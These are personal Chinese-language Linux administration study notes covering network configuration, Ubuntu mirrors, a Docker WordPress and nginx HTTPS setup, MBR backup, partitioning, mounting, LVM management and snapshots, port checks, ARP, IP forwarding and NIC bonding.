[14:01:43 root@hostname network-scripts]#rm -rf ifcfg-ens33
[14:01:43 root@hostname network-scripts]#touch ifcfg-eth0
[14:01:43 root@hostname network-scripts]#vim ifcfg-eth0
#开始修改配置
   DEVICE=eth0 #针对的是ip a里面的网卡名
   NAME=eth0
   BOOTPROTO=static #表示静态地址还是动态地址
   IPADDR=10.0.0.7 #这里是你要修改的固定ip(必备)
   PREFIX=24 #子网掩码(必备)
   GATEWAY=10.0.0.2(必备)
   DNS1=10.0.0.2(必备)
   DNS2=180.76.76.76
   ONBOOT=yes #表示这个网卡是否被启用
[14:01:43 root@hostname network-scripts]#reboot
[14:01:43 root@hostname network-scripts]#service network
```

### 5.3网卡ip配置(Ubuntu)

#### 5.3.1配置自动获取ip

```
 #这是针对Ubuntu的配置，Ubuntu重启后生成eth0网卡，xshell连不上去
[21:34:31 root@ubuntu1804 ~]$sudo -i
[21:34:31 root@ubuntu1804 ~]$cd /etc/netplan/
[21:34:31 root@ubuntu1804 ~]$cp 01-netcfg.yaml eth0.yaml
[21:34:31 root@ubuntu1804 ~]$rm -rf 01-netcfg.yaml
[21:34:31 root@ubuntu1804 ~]$vim eth0.yaml
#vim进入eth0.yaml后把ens33改成eth0,注意缩进不能变
network:
 version: 2
 renderer: networkd
 ethernets:
   eth0:
     dhcp4: yes
[21:34:31 root@ubuntu1804 ~]$netplan apply
```

![1650476512560](linuxSRE.assets/1650476512560.png)

#### 5.3.2配置静态ip

``` 
#这些都是在VMware里面操作
[21:34:31 root@ubuntu1804 ~]$cd /etc/netplan/
[21:34:31 root@ubuntu1804 ~]$vim eth0.yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    eth0:
      addresses:
        - 10.0.0.101/24
        - 192.168.0.102/24
      gateway4: 10.0.0.2
      nameservers:
       search: [magedu.com, magedu.org]
       addresses: [180.76.76.76, 8.8.8.8, 1.1.1.1]
[21:34:31 root@ubuntu1804 ~]$netplan apply
[21:34:31 root@ubuntu1804 ~]$ip a
#如果ip地址连对了以后出现下图的这种情况
#则要修改Ubuntu与允许root进行远程连接的配置
[21:34:31 root@ubuntu1804 ~]$vim /etc/ssh/sshd_config
#PermitRootLogin prohibit-password
改成PermitRootLogin yes
[21:34:31 root@ubuntu1804 ~]$passwd #给root设置密码
[21:34:31 root@ubuntu1804 ~]$systemctl restart sshd

#xshell里面操作
[root@ubuntu1804]:/etc/netplan# route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         10.0.0.2        0.0.0.0         UG    0      0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0
192.168.0.0     0.0.0.0         255.255.255.0   U     0      0        0 eth0
root@ubuntu1804:/etc/netplan# systemd-resolve  --status #查看DNS
DNS Servers: 180.76.76.76
              8.8.8.8 #谷歌DNS
              1.1.1.1 #澳大利亚DNS
```

![1650477615618](linuxSRE.assets/1650477615618.png)

#### 5.3.3多网卡设置地址

```
[21:34:31 root@ubuntu1804 ~]$cd /etc/netplan/
root@ubuntu1804:/etc/netplan# cp eth0.yaml eth1.yaml
root@ubuntu1804:/etc/netplan# vim eth1.yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    eth1:
      addresses:
        - 10.0.0.200/24
```

![1650480316295](linuxSRE.assets/1650480316295.png)

## 6.ubuntu换国内源

```
[14:47:36 liu@ubuntu1804 main]$cd /mnt/pool/main
[14:47:36 liu@ubuntu1804 main]$ll /etc/apt/sources.list
[14:50:39 liu@ubuntu1804 main]$sudo -i
[root@ubuntu1804:~]#sed -i.bak 's/hk.archive.ubuntu.com/mirrors.aliyun.com/' /etc/apt/sources.list
[root@ubuntu1804:~]#sed -ri.bak 's#(.*//).*\.ubuntu\.com#\1mirrors.aliyun.com#' /etc/apt/sources.list
#更新一下是否国内源安装成功:我换的是华为云
[root@ubuntu1804:~]#apt update
```

![1650101952858](linuxSRE.assets/1650101952858.png)

## 7.CentOS硬盘分区

```
[18:32:02 root@hostname ~]#lsblk
```

![1650105256249](linuxSRE.assets/1650105256249.png)

## 8.搭建网站

### **8.1linux上配置环境并启动**

```
[root@iZ8vbhnpxkxosj8s8q7w0tZ ~]# history
    1  ls
    2  yum install -y yum-utils device-mapper-persistent-data lvm2
    3  yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
    4  yum -y install docker-ce
    5  systemctl start docker
    6  systemctl enable docker
    7  docker ps
    8  docker info
    9  docker pull wordpress
   10  docker run -d --name liuAliyun -p 80:80 wordpress
   11  docker ps
   12  docker logs -f liuAliyun
   13  netstat -anlptu |grep 80
[root@paranoid ~]# /etc/init.d/bt default #启动宝塔linux
```

![1650118813211](linuxSRE.assets/1650118813211.png)

### **8.2Nginx配置https证书**

```
[root@iZ8vbhnpxkxosj8s8q7w0tZ conf.d]# pwd
/etc/nginx/conf.d
[root@iZ8vbhnpxkxosj8s8q7w0tZ conf.d]# vim liusenbiao.conf

upstream liusenbiao_www {
         server 172.20.114.179   weight=5;
}
server {
        listen 443 ssl;  # 1.1版本后这样写
        server_name www.liusenbiao.cn; #填写绑定证书的域名
        ssl_certificate www/server/nginx/conf/ssl/ssl.pem;  # 指定证书的位置，绝对路径
        ssl_certificate_key www/server/nginx/conf/ssl/ssl.key;  # 绝对路径，同上
        ssl_session_timeout 5m;
        ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #按照这个协议配置
        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;#按照这个套>件配置
        ssl_prefer_server_ciphers on;
        location / {
                proxy_pass http://liusenbiao_www;
           }
        }
```

## 9.把桌面上压缩包拖到xshell

```
[20:52:43 root@hostname ~]#yum -y install lrzsz
#安装解压缩的工作
[20:52:43 root@hostname ~]#yum -y install unzip
```

![1650121430564](linuxSRE.assets/1650121430564.png)

## 10.备份硬盘数据

### **10.1远程备份**

```
[11:14:45 root@hostname ~]#hexdump -C -n 512 /dev/sda
[13:34:28 root@hostname ~]#dd if=/dev/sda of=/data/mbr bs=1 count=64 skip=446 #if读入，of读出
[13:39:04 root@hostname ~]#ll /data/mbr #确认是64个字节
#-rw-r--r-- 1 root root 64 Apr 17 13:39 /data/mbr
#备份到远程服务器上，这是我的阿里云的服务器ip
[13:48:28 root@hostname ~]#scp /data/mbr 39.103.190.214:
```

![1650178096249](linuxSRE.assets/1650178096249.png)

### **10.2进入VM的rescue模式**

```
#进入rescue模式非常的坑，出现下面这个模式的时候，你要先按一下鼠标的左键，然后有且仅且只能按一次esc键才能成功进入，时间只有0.5s，非常的坑！！！！
```

![1650178622349](linuxSRE.assets/1650178622349.png)

### **10.3连网进行远程备份**

```
[sh-4]#ip a a 10.0.0.8/24 dev ens33
[sh-4]#ping 10.0.0.7 #ping你刚才的远程备份的机器,只能是同一个网段
[sh-4]#scp 10.0.0.7:/root/mbr .#远程机器备份到当前目录
[sh-4]#ls -l mbr #查看是否是64字节文件
[sh-4]#dd if=mbr of=dev/sda bs=1 count=64 seek=446
[sh-4]#sync #立即写磁盘
```

## 11.管理存储三要素

### **11.1.fdisk分区**

```
fidisk /dev/sd.*
-子命令
p 分区列表
t 更改分区类型
n 创建新分区
d 删除分区
v 校验分区
u 转换单位
w 保存并退出
q 不保存并退出
```

![1650248722212](linuxSRE.assets/1650248722212.png)

### 11.2.**创建文件系统**

```
mkfs命令：
(1) mkfs.FS_TYPE /dev/DEVICE
 ext4
 xfs
 btrfs
 vfat
-常用选项
-t {ext2|ext3|ext4|xfs} 指定文件系统类型
-b {1024|2048|4096} 指定块 block 大小
-L ‘LABEL’ 设置卷标
-j 相当于 -t ext3， mkfs.ext3 = mkfs -t ext3 = mke2fs -j = mke2fs -  t ext3
-i  # 为数据空间中每多少个字节创建一个inode；不应该小于block大 小
-N  # 指定分区中创建多少个inode
-I 一个inode记录占用的磁盘空间大小，128---4096
-m  # 默认5%,为管理人员预留空间占总空间的百分比
-O FEATURE[,...] 启用指定特性
-O ^FEATURE 关闭指定特性
```

![1650249020070](linuxSRE.assets/1650249020070.png)

### 11.3**挂载**

- 挂载规则:
- 一个挂载点同一时间只能挂载一个设备
- 一个挂载点同一时间挂载了多个设备，只能看到最后一个设备的数据，其它设备上的数据将被隐藏
- 一个设备可以同时挂载到多个挂载点
- 通常挂载点一般是已存在空的目录

```
[10:29:35 root@hostname ~]#mount /dev/sdb5 /mnt
#mountpoint：挂载点目录必须事先存在，建议使用空目录,如果不是空目录，之前的文件就会隐藏
#可以一个设备挂载到不同的空文件夹里，一个空的文件夹只能对应唯一的挂载设备
-mount 常用命令选项
-t fstype 指定要挂载的设备上的文件系统类型,如:ext4,xfs
-r readonly，只读挂载
-w read and write, 读写挂载
-n 不更新/etc/mtab，mount不可见
-a 自动挂载所有支持自动挂载的设备(定义在了/etc/fstab文件中，且挂载选项中有
auto功能)
-L 'LABEL' 以卷标指定挂载设备
-U 'UUID' 以UUID指定要挂载的设备
-B, --bind 绑定目录到另一个目录上
-o options：(挂载文件系统的选项)，多个选项使用逗号分隔
 async   异步模式,内存更改时,写入缓存区buffer,过一段时间再写到磁盘中，效率高，但不安全
   sync   同步模式,内存更改时，同时写磁盘，安全，但效率低下
 atime/noatime 包含目录和文件
 diratime/nodiratime 目录的访问时间戳
 auto/noauto 是否支持开机自动挂载，是否支持-a选项
 exec/noexec 是否支持将文件系统上运行应用程序
 dev/nodev 是否支持在此文件系统上使用设备文件
 suid/nosuid 是否支持suid和sgid权限
 remount 重新挂载
 ro/rw 只读、读写   
 user/nouser 是否允许普通用户挂载此设备，/etc/fstab使用
 acl/noacl 启用此文件系统上的acl功能
 loop 使用loop设备
 _netdev   当网络可用时才对网络资源进行挂载，如：NFS文件系统
 defaults 相当于rw, suid, dev, exec, auto, nouser, async
```

案例：

```
[10:29:35 root@hostname ~]#mount -o ro /dev/sdb1 /mnt/ #只读
[10:29:35 root@hostname ~]#mount -o remount,rw /mnt/#取消只读，改为读写都可以
#查看谁在使用挂载点
[10:29:35 root@hostname ~]#fuser -v /mnt/
                     USER        PID ACCESS COMMAND
/mnt:                root     kernel mount /mnt
                     root       5144 ..c.. bash #使用的进程
[10:42:15 root@hostname ~]#fuser -km /mnt/ #把进程直接踢出终端
[10:42:15 root@hostname ~]#findmnt /mnt/ #查看是否是挂载点
```

![1650249750216](linuxSRE.assets/1650249750216.png)

**挂载持久化**

```
[10:46:52 root@hostname ~]#blkid #查看挂载的UUID
[10:54:39 root@hostname ~]#mkdir /data/mysql
[10:59:52 root@hostname ~]#vim /etc/fstab #在这里实现永久挂载
[11:11:23 root@hostname ~]#mount -a #立即生效
```

![1650251685743](linuxSRE.assets/1650251685743.png)

![1650252053621](linuxSRE.assets/1650252053621.png)

## 12.逻辑卷实现

![1650276516117](linuxSRE.assets/1650276516117.png)

### **12.1把一个硬盘sdc和一个分区sdb/sdb1放到逻辑卷中**

```
[18:10:08 root@hostname ~]#yum -y install lvm2 #先安装包
#案例：把一个硬盘sdc和一个分区sdb/sdb1放到逻辑卷中
#1.先分区
[18:19:38 root@hostname ~]#fdisk /dev/sdb
Welcome to fdisk (util-linux 2.23.2).

Changes will remain in memory only, until you decide to write them.
Be careful before using the write command.


Command (m for help): p

Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x9a668bca

   Device Boot      Start         End      Blocks   Id  System
/dev/sdb1            2048     2099199     1048576   83  Linux
/dev/sdb2         2099200    23070719    10485760    5  Extended
/dev/sdb3        23070720    33556479     5242880   83  Linux

Command (m for help): m
Command action
   a   toggle a bootable flag
   b   edit bsd disklabel
   c   toggle the dos compatibility flag
   d   delete a partition
   g   create a new empty GPT partition table
   G   create an IRIX (SGI) partition table
   l   list known partition types
   m   print this menu
   n   add a new partition
   o   create a new empty DOS partition table
   p   print the partition table
   q   quit without saving changes
   s   create a new empty Sun disklabel
   t   change a partition's system id
   u   change display/entry units
   v   verify the partition table
   w   write table to disk and exit
   x   extra functionality (experts only)

Command (m for help): t
Partition number (1-3, default 3): 
Hex code (type L to list all codes): L

 0  Empty           24  NEC DOS         81  Minix / old Lin bf  Solaris        
 1  FAT12           27  Hidden NTFS Win 82  Linux swap / So c1  DRDOS/sec (FAT-
 2  XENIX root      39  Plan 9          83  Linux           c4  DRDOS/sec (FAT-
 3  XENIX usr       3c  PartitionMagic  84  OS/2 hidden C:  c6  DRDOS/sec (FAT-
 4  FAT16 <32M      40  Venix 80286     85  Linux extended  c7  Syrinx         
 5  Extended        41  PPC PReP Boot   86  NTFS volume set da  Non-FS data    
 6  FAT16           42  SFS             87  NTFS volume set db  CP/M / CTOS / .
 7  HPFS/NTFS/exFAT 4d  QNX4.x          88  Linux plaintext de  Dell Utility   
 8  AIX             4e  QNX4.x 2nd part 8e  Linux LVM       df  BootIt         
 9  AIX bootable    4f  QNX4.x 3rd part 93  Amoeba          e1  DOS access     
 a  OS/2 Boot Manag 50  OnTrack DM      94  Amoeba BBT      e3  DOS R/O        
 b  W95 FAT32       51  OnTrack DM6 Aux 9f  BSD/OS          e4  SpeedStor      
 c  W95 FAT32 (LBA) 52  CP/M            a0  IBM Thinkpad hi eb  BeOS fs        
 e  W95 FAT16 (LBA) 53  OnTrack DM6 Aux a5  FreeBSD         ee  GPT            
 f  W95 Ext'd (LBA) 54  OnTrackDM6      a6  OpenBSD         ef  EFI (FAT-12/16/
10  OPUS            55  EZ-Drive        a7  NeXTSTEP        f0  Linux/PA-RISC b
11  Hidden FAT12    56  Golden Bow      a8  Darwin UFS      f1  SpeedStor      
12  Compaq diagnost 5c  Priam Edisk     a9  NetBSD          f4  SpeedStor      
14  Hidden FAT16 <3 61  SpeedStor       ab  Darwin boot     f2  DOS secondary  
16  Hidden FAT16    63  GNU HURD or Sys af  HFS / HFS+      fb  VMware VMFS    
17  Hidden HPFS/NTF 64  Novell Netware  b7  BSDI fs         fc  VMware VMKCORE 
18  AST SmartSleep  65  Novell Netware  b8  BSDI swap       fd  Linux raid auto
1b  Hidden W95 FAT3 70  DiskSecure Mult bb  Boot Wizard hid fe  LANstep        
1c  Hidden W95 FAT3 75  PC/IX           be  Solaris boot    ff  BBT            
1e  Hidden W95 FAT1 80  Old Minix      
Hex code (type L to list all codes): 8e
Changed type of partition 'Linux' to 'Linux LVM'

Command (m for help): p

Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x9a668bca

   Device Boot      Start         End      Blocks   Id  System
/dev/sdb1            2048     2099199     1048576   83  Linux
/dev/sdb2         2099200    23070719    10485760    5  Extended
/dev/sdb3        23070720    33556479     5242880   8e  Linux LVM

Command (m for help): w
The partition table has been altered!

Calling ioctl() to re-read partition table.
Syncing disks./
[19:19:10 root@hostname ~]#pvcreate /dev/sdb3 /dev/sdc
#可能会出现sdc挂载不成功，先用命令lsblk -f看出sdc是不是在别的地方挂载
#比如我就在创建不成功 就是因为先前做实验用了swap挂载了，于是swapoff /dev/sdc1取消swap的挂载就能precreate成功了
```

![1650281348967](linuxSRE.assets/1650281348967.png)

### 12.2把各个物理卷vgcreate成卷组

```
[19:42:53 root@hostname ~]#vgcreate vg0 /dev/sd{b3,c}
  Volume group "vg0" successfully created
[19:47:42 root@hostname ~]#pvdisplay 
  --- Physical volume ---
  PV Name               /dev/sdb3
  VG Name               vg0
  PV Size               5.00 GiB / not usable 4.00 MiB
  Allocatable           yes 
  PE Size               4.00 MiB
  Total PE              1279
  Free PE               1279
  Allocated PE          0
  PV UUID               Tl5MRb-qwdr-OE3f-2Pi3-yhYf-qkWJ-HU3k51
   
  --- Physical volume ---
  PV Name               /dev/sdc
  VG Name               vg0
  PV Size               10.00 GiB / not usable 4.00 MiB
  Allocatable           yes 
  PE Size               4.00 MiB
  Total PE              2559
  Free PE               2559
  Allocated PE          0
  PV UUID               EgzsLv-xYnS-afBB-4wT5-Lt9M-T7Hx-SE08F9
  [19:48:38 root@hostname ~]#vgs
  VG  #PV #LV #SN Attr   VSize  VFree 
  vg0   2   0   0 wz--n- 14.99g 14.99g
```

### 12.3创建逻辑卷

```
[19:52:08 root@hostname ~]#lvcreate -n mysql -L 1G vg0
  Logical volume "mysql" created.
[19:55:14 root@hostname ~]#lvs
  LV    VG  Attr       LSize Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
  mysql vg0 -wi-a----- 1.00g  
[19:55:32 root@hostname ~]#lvdisplay
```

![1650283022951](linuxSRE.assets/1650283022951.png)

### 12.4创建文件系统

```
[20:01:12 root@hostname ~]#mkfs.ext4 /dev/vg0/mysql
[20:03:40 root@hostname ~]#blkid
[20:05:01 root@hostname ~]#vim /etc/fstab
#UUID=21c51054-01b2-490e-918d-58479d0f1bbd /mnt/mysql              ext4    defaults            0 0         
[20:43:54 root@hostname ~]#mkdir /mnt/mysql
[20:44:17 root@hostname ~]#mount -a
[20:44:20 root@hostname ~]#df
```

![1650286002584](linuxSRE.assets/1650286002584.png)

### 12.5逻辑卷扩容

```
[21:47:27 root@hostname ~]#vgdisplay #先查看卷组的空间好不好扩
#逻辑卷扩容卷组容量的百分之50，+50%表示扩容50G,50%表示扩容到50G
[22:42:18 root@hostname ~]#lvextend -l +50%free /dev/vg0/mysql
[22:45:00 root@hostname ~]#lvdisplay
#resize2fs只针对ext4的的文件系统
[22:52:20 root@hostname ~]#resize2fs /dev/vg0/mysql #进行同步扩容
#xfs文件系统进行扩容
[22:53:09 root@hostname ~]#lvextend -L +1G /dev/vg0/log
[23:13:57 root@hostname ~]#xfs_growfs /mnt/log
[23:14:33 root@hostname ~]#vgdisplay #查看还剩余多少卷组空间可用
#忽略文件系统，通用扩容方式，这个命令是扩容同步一体化
[23:22:56 root@hostname ~]#lvextend -r -l +100%free /dev/vg0/mysql
[23:25:59 root@hostname ~]#df -Th #查看文件系统
```

![1650293364051](linuxSRE.assets/1650293364051.png)

![1650293764188](linuxSRE.assets/1650293764188.png)

### 12.6物理卷扩容

因为逻辑卷都用光了，所以要扩容物理卷

```
[23:26:11 root@hostname ~]#lsblk #查看还有多少空间可用
[23:29:53 root@hostname ~]#fdisk /dev/sdb
Welcome to fdisk (util-linux 2.23.2).

Changes will remain in memory only, until you decide to write them.
Be careful before using the write command.


Command (m for help): p

Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x9a668bca

   Device Boot      Start         End      Blocks   Id  System
/dev/sdb1            2048     2099199     1048576   83  Linux
/dev/sdb2         2099200    23070719    10485760    5  Extended
/dev/sdb3        23070720    33556479     5242880   8e  Linux LVM

Command (m for help): n
Partition type:
   p   primary (2 primary, 1 extended, 1 free)
   l   logical (numbered from 5)
Select (default p): p
Selected partition 4
First sector (33556480-41943039, default 33556480): 
Using default value 33556480
Last sector, +sectors or +size{K,M,G} (33556480-41943039, default 41943039): 
Using default value 41943039
Partition 4 of type Linux and of size 4 GiB is set

Command (m for help): p

Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x9a668bca

   Device Boot      Start         End      Blocks   Id  System
/dev/sdb1            2048     2099199     1048576   83  Linux
/dev/sdb2         2099200    23070719    10485760    5  Extended
/dev/sdb3        23070720    33556479     5242880   8e  Linux LVM
/dev/sdb4        33556480    41943039     4193280   83  Linux

Command (m for help): t
Partition number (1-4, default 4): 
Hex code (type L to list all codes): 8e
Changed type of partition 'Linux' to 'Linux LVM'

Command (m for help): p

Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x9a668bca

  Device Boot      Start         End      Blocks   Id  System
/dev/sdb1            2048     2099199     1048576   83  Linux
/dev/sdb2         2099200    23070719    10485760    5  Extended
/dev/sdb3        23070720    33556479     5242880   8e  Linux LVM
/dev/sdb4        33556480    41943039     4193280   8e  Linux LVM

Command (m for help): w
The partition table has been altered!

Calling ioctl() to re-read partition table.

WARNING: Re-reading the partition table failed with error 16: Device or resource busy.
The kernel still uses the old table. The new table will be used at
the next reboot or after you run partprobe(8) or kpartx(8)
Syncing disks.
[23:37:14 root@hostname ~]#partprobe #重新启动
[23:43:53 root@hostname ~]#pvcreate /dev/sdb4 #sdb4变成物理卷
[23:45:18 root@hostname ~]#vgextend vg0 /dev/sdb4 #把sdb4加入卷组vg0中
```

![1650296900038](linuxSRE.assets/1650296900038.png)

### 12.7离线缩容逻辑卷(了解)

```
#这是抽象出来的五大步骤
umount /dev/VG_NAME/LV_NAME
e2fsck -f /dev/VG_NAME/LV_NAME
resize2fs /dev/VG_NAME/LV_NAME #[mMgGtT]
lvreduce -L [-]#[mMgGtT] /dev/VG_NAME/LV_NAME
mount /dev/VG_NAME/LV_NAME mountpoint

#具体缩容实际例子并且只能缩ext4   
[23:47:26 root@hostname ~]#df -Th
Filesystem            Type      Size  Used Avail Use% Mounted on
devtmpfs              devtmpfs  1.5G     0  1.5G   0% /dev
tmpfs                 tmpfs     1.5G     0  1.5G   0% /dev/shm
tmpfs                 tmpfs     1.5G  8.9M  1.5G   1% /run
tmpfs                 tmpfs     1.5G     0  1.5G   0% /sys/fs/cgroup
/dev/sda2             xfs       100G  3.1G   97G   4% /
/dev/sda5             xfs        50G   35M   50G   1% /data
/dev/sda1             ext4      976M  145M  765M  16% /boot
tmpfs                 tmpfs     297M     0  297M   0% /run/user/0
/dev/mapper/vg0-mysql ext4       12G  5.0M   12G   1% /mnt/mysql
/dev/mapper/vg0-log   xfs       3.0G   33M  3.0G   2% /mnt/log
[00:01:59 root@hostname ~]#umount /mnt/mysql 
[00:03:05 root@hostname ~]#fsck -f /dev/vg0/mysql #检查文件系统的完整性
[00:04:27 root@hostname ~]#resize2fs /dev/vg0/mysql 2G
#注意逻辑卷的缩减要和之前缩减的大小相一直
[00:05:28 root@hostname ~]#lvreduce -L 2G /dev/vg0/mysql
[00:06:18 root@hostname ~]#mount -a #重新挂载
[00:10:03 root@hostname ~]#ls /mnt/mysql #确保数据能够正常访问
```

![1650298182086](linuxSRE.assets/1650298182086.png)

### 12.8删除逻辑卷

```
#创建逻辑卷是从下往上创建
#删除逻辑卷是从上往下删除
[01:39:03 root@hostname ~]#umount /mnt/mysql 
[01:39:20 root@hostname ~]#umount /mnt/log 
[01:39:26 root@hostname ~]#lvremove /dev/vg0/mysql #逻辑卷删除
[01:39:58 root@hostname ~]#lvremove /dev/vg0/log #逻辑卷删除
[01:41:04 root@hostname ~]#vgremove vg0 #卷组删除
[01:43:09 root@hostname ~]#pvs
 PV         VG Fmt  Attr PSize  PFree 
  /dev/sdb3     lvm2 ---   5.00g  5.00g
  /dev/sdb4     lvm2 ---  <4.00g <4.00g
[01:43:31 root@hostname ~]#pvremove /dev/sd{b3,b4} #物理卷删除
[01:46:21 root@hostname ~]#fdisk /dev/sdb #删除分区
Welcome to fdisk (util-linux 2.23.2).

Changes will remain in memory only, until you decide to write them.
Be careful before using the write command.


Command (m for help): p

Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x9a668bca

   Device Boot      Start         End      Blocks   Id  System
/dev/sdb1            2048     2099199     1048576   83  Linux
/dev/sdb2         2099200    23070719    10485760    5  Extended
/dev/sdb3        23070720    33556479     5242880   8e  Linux LVM
/dev/sdb4        33556480    41943039     4193280   8e  Linux LVM

Command (m for help): d
Partition number (1-4, default 4): 3
Partition 3 is deleted

Command (m for help): d
Partition number (1,2,4, default 4): 
Partition 4 is deleted

Command (m for help): p

Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
Units = sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disk label type: dos
Disk identifier: 0x9a668bca

   Device Boot      Start         End      Blocks   Id  System
/dev/sdb1            2048     2099199     1048576   83  Linux
/dev/sdb2         2099200    23070719    10485760    5  Extended

Command (m for help): w
The partition table has been altered!

Calling ioctl() to re-read partition table.
Syncing disks.
```

## 13.转移硬盘步骤

如果在公司里出现了硬盘老化，需要移走硬盘，但是空间已经被占用给逻辑卷组用了，所以不好直接拆，故需要以下几个步骤

### 13.1查看PE值

```
#要看要移走的硬盘的PE值是否小于其余硬盘PE值之和，才能移走
[00:10:07 root@hostname ~]#pvdisplay
```

![1650299290484](linuxSRE.assets/1650299290484.png)

### 13.2开始搬运空间

```
[00:32:56 root@hostname ~]#pvmove /dev/sdc #空间搬家
  /dev/sdc: Moved: 3.91%
  /dev/sdc: Moved: 100.00%
[00:36:22 root@hostname ~]#vgreduce vg0 /dev/sdc #移出vg0组
  Removed "/dev/sdc" from volume group "vg0"
[00:38:11 root@hostname ~]#pvremove /dev/sdc #移出物理卷
  Labels on physical volume "/dev/sdc" successfully wiped.
[00:38:44 root@hostname ~]#pvs #查看
  PV         VG  Fmt  Attr PSize  PFree   
  /dev/sdb3  vg0 lvm2 a--  <5.00g 1020.00m
  /dev/sdb4  vg0 lvm2 a--  <4.00g   <3.00g
```

![1650299819111](linuxSRE.assets/1650299819111.png)

## 14.逻辑卷快照

案例：

```
#创建实验环境：针对的是ext4的文件系统
[01:00:51 root@hostname ~]#cp /etc/fstab /mnt/mysql/f1.txt
[01:01:44 root@hostname ~]#cp /etc/fstab /mnt/mysql/f2.txt
[01:01:49 root@hostname ~]#cp /etc/fstab /mnt/mysql/f3.txt
[01:01:53 root@hostname ~]#ls /mnt/mysql/
f1.txt  f2.txt  f3.txt  lost+found
[01:02:02 root@hostname ~]#vgdisplay #查看卷组是否有足够空间
#-s表示快照
#-n表示指定名
#-p r只读
#逻辑卷快照可以小于文件
[01:10:06 root@hostname ~]#lvcreate -s -n mysql-snapshot -L 100M -p r/dev/vg0/mysql
#开始对源文件进行修改
[01:10:06 root@hostname ~]#mkdir /mnt/snap #做挂载
#ext4做挂载
[01:12:43 root@hostname ~]#mount -o ro,nouuid /dev/vg0/mysql-snapshot /mnt/snap
#xfs做挂载
[01:12:43 root@hostname ~]#mount /dev/vg0/mysql-snapshot /mnt/snap
[01:15:07 root@hostname ~]#vim /mnt/mysql/f1.txt
[01:16:53 root@hostname ~]#rm -rf /mnt/mysql/f2.txt 
[01:17:21 root@hostname ~]#touch /mnt/mysql/f4.txt
[01:17:40 root@hostname ~]#ll /mnt/snap/
#快照进行还原，快照使命只有一次，用了就自动删除了
[01:18:17 root@hostname ~]#umount /mnt/snap 
[01:20:54 root@hostname ~]#umount /mnt/mysql
[01:21:19 root@hostname ~]#lvconvert --merge /dev/vg0/mysql-snapshot #进行快照还原的命令
[01:23:42 root@hostname ~]#mount -a 
[01:23:56 root@hostname ~]#ls /mnt/mysql/
```

![1650302985051](linuxSRE.assets/1650302985051.png)

## 15.RAID总结

![1650276398890](linuxSRE.assets/1650276398890.png)

## 16.判断端口号被谁占用

```
[02:11:00 root@hostname ~]#yum -y install nc #用来做网络测试
[02:12:00 root@hostname ~]#nc -l 6666 #占用6666端口号
#方式一：
[02:12:39 root@hostname ~]#ss -ntlp
#方式二：
[02:14:05 root@hostname ~]#lsof -i :6666
```

![1650305821914](linuxSRE.assets/1650305821914.png)

## 17.ARP协议

```
[11:28:15 root@hostname ~]#ping 10.0.0.153
[11:29:28 liu@ubuntu1804 ~]$sudo tcpdump -i ens33 arp -nn #类似抓包
[11:28:15 root@hostname ~]#arp -n #ip到mac映射
[11:28:15 root@hostname ~]#arping 10.0.0.153 #如果有两个mac地址则冲突
```

![1650426032557](linuxSRE.assets/1650426032557.png)

![1650471795705](linuxSRE.assets/1650471795705.png)

## 18.开启路由转发

```
[19:29:18 root@centos7 ~]#sysctl -a |grep ip_forward
 #net.ipv4.ip_forward = 0
[19:32:21 root@centos7 ~]#vim /etc/sysctl.conf
 #改这个net.ipv4.ip_forward = 1
[19:57:02 root@centos7 ~]#sysctl -p #让他立即生效
```

![1650455938089](linuxSRE.assets/1650455938089.png)

## 19.多网卡绑定

### 19.1bonding工作模式

```
共7种模式：0-6 Mode
Mode 0 (balance-rr)： 轮询（Round-robin）策略，从头到尾顺序的在每一个slave接口上面发送

数据包。本模式提供负载均衡和容错的能力

Mode 1 (active-backup)： 活动-备份（主备）策略，只有一个slave被激活，当且仅当活动的
slave接口失败时才会激活其他slave.为了避免交换机发生混乱此时绑定的MAC地址只有一个外部
端口上可见
Mode 3 (broadcast)：广播策略，在所有的slave接口上传送所有的报文,提供容错能力
说明：
active-backup、balance-tlb 和 balance-alb 模式不需要交换机的任何特殊配置。其他绑定模式需要配
置交换机以便整合链接。如：Cisco 交换机需要在模式 0、2 和 3 中使用 EtherChannel，但在模式4中
需要 LACP和 EtherChannel
```

### 19.2添加bonding接口

```
[20:56:07 root@centos7 ~]#nmcli connection add con-name mybond0 ifname bond0 type bond mode active-backup ipv4.method manual ipv4.addresses 10.0.0.100/24
